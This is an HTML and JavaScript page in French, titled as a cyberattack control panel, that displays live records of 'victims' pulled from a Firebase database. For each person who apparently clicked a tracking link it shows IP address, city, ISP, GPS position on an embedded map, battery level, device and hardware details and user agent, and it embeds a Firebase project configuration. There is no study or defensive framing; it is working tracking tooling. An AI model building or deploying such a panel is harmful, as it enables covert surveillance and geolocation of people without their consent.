<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panneau de Contrôle - Cyberattaque</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * { scrollbar-width: thin; scrollbar-color: #27272a #0a0a0a; }
        *::-webkit-scrollbar { width: 8px; }
        *::-webkit-scrollbar-track { background: #0a0a0a; }
        *::-webkit-scrollbar-thumb { background: #27272a; border-radius: 4px; }

        body { 
            font-family: 'Outfit', sans-serif; 
            background-color: #0a0a0a;
            color: white;
            min-height: 100vh;
        }
        .mono { font-family: 'JetBrains Mono', monospace; }

        details {
            border: 1px solid #27272a;
            border-radius: 10px;
            background-color: #18181b;
            margin-bottom: 10px;
            overflow: hidden;
            transition: border-color 0.2s;
        }
        details[open] {
            border-color: #ef4444;
        }
        summary {
            padding: 14px 18px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            list-style: none;
            transition: background 0.2s;
        }
        summary::-webkit-details-marker { display: none; }
        summary:hover {
            background-color: #1f1f23;
        }
        .summary-left {
            display: flex;
            align-items: center;
            gap: 14px;
            flex: 1;
            min-width: 0;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background-color: #22c55e;
            box-shadow: 0 0 8px #22c55e;
            animation: pulse 1.5s infinite;
            flex-shrink: 0;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .details-content {
            padding: 18px;
            background-color: #0f0f10;
            border-top: 1px solid #27272a;
        }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        @media (min-width: 640px) {
            .info-grid { grid-template-columns: repeat(3, 1fr); }
        }
        .info-item {
            display: flex;
            flex-direction: column;
            background: #18181b;
            border: 1px solid #27272a;
            border-radius: 6px;
            padding: 8px 10px;
        }
        .info-label {
            font-size: 0.65rem;
            color: #71717a;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            margin-bottom: 3px;
        }
        .info-value {
            font-weight: 600;
            color: #e4e4e7;
            font-size: 0.82rem;
            word-break: break-word;
        }
        .info-value.highlight {
            color: #22c55e;
        }
        .info-value.danger {
            color: #ef4444;
        }
        .new-badge {
            background: #ef4444;
            color: white;
            font-size: 0.6rem;
            padding: 2px 6px;
            border-radius: 4px;
            font-weight: 900;
            letter-spacing: 0.05em;
            animation: pulse 1s infinite;
        }
    </style>
</head>
<body class="p-4 sm:p-6">
    <div class="max-w-4xl mx-auto">
        <!-- Header -->
        <div class="text-center mb-8">
            <div class="inline-flex items-center gap-2 bg-red-600/10 border border-red-600/30 px-4 py-1.5 rounded-full mb-3">
                <span class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
                <span class="text-red-500 text-xs font-black uppercase tracking-widest">Live</span>
            </div>
            <h1 class="text-3xl font-black text-red-500 uppercase tracking-widest mb-1">Panneau de Contrôle</h1>
            <p class="text-xs text-zinc-400">Surveillance en temps réel des victimes</p>
            <p class="text-[10px] text-zinc-600 mt-1">
                <span id="total-count">0</span> victime(s) connectée(s)
            </p>
        </div>

        <!-- Liste des victimes -->
        <div id="victim-container">
            <div class="text-center py-20">
                <div class="w-16 h-16 border-4 border-zinc-800 border-t-red-500 rounded-full animate-spin mx-auto mb-4"></div>
                <p class="text-zinc-500 text-sm">En attente d'une victime...</p>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, onSnapshot, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
            authDomain: "test-9022.firebaseapp.com",
            projectId: "test-9022",
            storageBucket: "test-9022.firebasestorage.app",
            messagingSenderId: "945536290936",
            appId: "1:945536290936:web:de1437cea95e63cb559d8d",
            measurementId: "G-RSKK2KZDQR"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // On garde en mémoire les IDs déjà vus pour détecter les nouvelles victimes
        const seenIds = new Set();
        let firstLoad = true;

        const q = query(
            collection(db, "visites_mysteres"),
            orderBy("date_clic", "desc"),
            limit(30)
        );

        onSnapshot(q, (snapshot) => {
            const container = document.getElementById('victim-container');
            const totalCount = document.getElementById('total-count');
            
            if (snapshot.empty) {
                container.innerHTML = `
                    <div class="text-center py-20">
                        <div class="w-16 h-16 border-4 border-zinc-800 border-t-red-500 rounded-full animate-spin mx-auto mb-4"></div>
                        <p class="text-zinc-500 text-sm">En attente d'une victime...</p>
                    </div>
                `;
                totalCount.textContent = '0';
                return;
            }

            // Reconstruire la liste complète
            container.innerHTML = '';
            let count = 0;

            snapshot.forEach((doc) => {
                const data = doc.data();
                const id = doc.id;
                const isNew = !firstLoad && !seenIds.has(id);
                seenIds.add(id);
                count++;

                // Formatage de l'heure
                let heure = data.heure_locale || 'à l\'instant';
                try {
                    if (data.date_clic && data.date_clic.seconds) {
                        const d = new Date(data.date_clic.seconds * 1000);
                        heure = d.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
                    }
                } catch(e) {}

                // Carte si latitude/longitude dispo
                let mapHtml = '';
                if (data.latitude && data.longitude) {
                    mapHtml = `
                        <div class="mb-4">
                            <iframe class="w-full h-48 rounded-lg border border-zinc-700" 
                                src="https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=13&output=embed" 
                                loading="lazy"></iframe>
                        </div>
                    `;
                }

                const details = document.createElement('details');
                details.className = 'group';

                // Résumé (ligne fermée)
                const summary = document.createElement('summary');
                summary.innerHTML = `
                    <div class="summary-left">
                        <span class="status-dot"></span>
                        <div class="min-w-0 flex-1">
                            <div class="flex items-center gap-2 flex-wrap">
                                <span class="mono text-green-400 font-bold text-sm">${data.ip || 'N/A'}</span>
                                ${isNew ? '<span class="new-badge">NOUVEAU</span>' : ''}
                            </div>
                            <div class="text-zinc-400 text-xs mt-0.5 truncate">
                                ${data.ville || 'Ville inconnue'}${data.pays ? ', ' + data.pays : ''} · ${data.type_appareil || 'Appareil inconnu'}
                            </div>
                        </div>
                    </div>
                    <div class="text-right flex-shrink-0 ml-3">
                        <div class="text-zinc-300 text-xs font-mono">${heure}</div>
                        <div class="text-zinc-600 text-[10px] font-mono mt-0.5">${data.session_id || ''}</div>
                    </div>
                `;

                // Contenu détaillé (ouvert)
                const content = document.createElement('div');
                content.className = 'details-content';
                content.innerHTML = `
                    ${mapHtml}
                    <div class="info-grid">
                        <div class="info-item"><span class="info-label">IP Publique</span><span class="info-value mono highlight">${data.ip || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Ville</span><span class="info-value">${data.ville || 'Inconnue'}</span></div>
                        <div class="info-item"><span class="info-label">Pays</span><span class="info-value">${data.pays || 'Inconnu'}</span></div>
                        <div class="info-item"><span class="info-label">FAI</span><span class="info-value">${data.isp || 'Inconnu'}</span></div>
                        <div class="info-item"><span class="info-label">Heure du clic</span><span class="info-value mono">${heure}</span></div>
                        <div class="info-item"><span class="info-label">Date locale</span><span class="info-value mono text-xs">${data.heure_locale || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Batterie</span><span class="info-value danger">${data.batterie || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">État batterie</span><span class="info-value">${data.etat_batterie || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Appareil</span><span class="info-value">${data.type_appareil || 'Inconnu'}</span></div>
                        <div class="info-item"><span class="info-label">Plateforme</span><span class="info-value">${data.plateforme || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Connexion</span><span class="info-value">${data.connexion || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Débit</span><span class="info-value">${data.debit || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">RTT</span><span class="info-value">${data.rtt || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Langue</span><span class="info-value">${data.langue || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Fuseau horaire</span><span class="info-value">${data.fuseau_horaire || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Résolution écran</span><span class="info-value mono">${data.resolution_ecran || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Profondeur couleur</span><span class="info-value">${data.profondeur_couleur || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Ratio pixel</span><span class="info-value">${data.pixel_ratio || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Orientation</span><span class="info-value">${data.orientation_ecran || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Points tactiles</span><span class="info-value">${data.points_tactiles || '0'}</span></div>
                        <div class="info-item"><span class="info-label">Cookies</span><span class="info-value">${data.cookies_actifs || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Statut</span><span class="info-value">${data.statut_online || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">CPU</span><span class="info-value">${data.cpu_cores || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${data.ram || 'N/A'}</span></div>
                        <div class="info-item"><span class="info-label">Webdriver</span><span class="info-value">${data.webdriver || 'Non'}</span></div>
                        <div class="info-item" style="grid-column: span 2;"><span class="info-label">URL de la page</span><span class="info-value mono text-xs">${data.url_page || 'N/A'}</span></div>
                    </div>
                    <div class="mt-3 bg-zinc-950 border border-zinc-800 rounded-lg p-3">
                        <div class="info-label mb-1">User Agent complet</div>
                        <div class="text-[10px] text-zinc-400 font-mono break-all leading-relaxed">${data.user_agent || 'N/A'}</div>
                    </div>
                `;

                details.appendChild(summary);
                details.appendChild(content);

                // Ouvrir automatiquement les nouvelles victimes
                if (isNew) {
                    details.open = true;
                }

                container.appendChild(details);
            });

            totalCount.textContent = count;
            firstLoad = false;
        });
    </script>
</body>
</html>
